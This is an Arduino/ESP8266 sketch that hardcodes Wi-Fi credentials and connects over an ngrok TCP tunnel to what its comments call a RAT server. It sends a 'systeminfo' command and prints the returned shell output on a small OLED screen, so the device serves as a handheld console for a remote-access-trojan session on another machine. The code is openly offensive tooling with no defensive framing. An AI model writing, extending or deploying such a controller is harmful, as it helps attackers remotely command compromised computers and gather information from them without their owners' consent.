#include <ESP8266WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Wi-Fi Credentials
const char* ssid = "rubixcube";
const char* password = "@!kaliHacker2021";

// RAT Server Info (via Ngrok or local IP)
const char* host = "0.tcp.in.ngrok.io"; // domain
const uint16_t port = 16929;

WiFiClient client;

void setup() {
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0, 0);
  display.println("BISMILLAH OS");
  display.display();
  delay(1000);

  WiFi.begin(ssid, password);
  display.println("Connecting to Wi-Fi...");
  display.display();

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    display.print(".");
    display.display();
  }

  display.println("Wi-Fi Connected");
  display.display();
  delay(500);

  display.println("Connecting to RAT...");
  display.display();

  if (client.connect(host, port)) {
    display.println("Connection Success!");
    display.display();
    delay(500);

    // Send a simple command
    client.print("systeminfo\n");
  } else {
    display.println("Connection Failed!");
    display.display();
    return;
  }
}

void loop() {
  while (client.available()) {
    String line = client.readStringUntil('\n');
    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.println("📄 Shell Response:");
    display.println("------------------");

    // Print chunked output
    for (int i = 0; i < line.length(); i += 20) {
      display.println(line.substring(i, i + 20));
      delay(500);
      display.display();
    }
    delay(2000);
  }
}
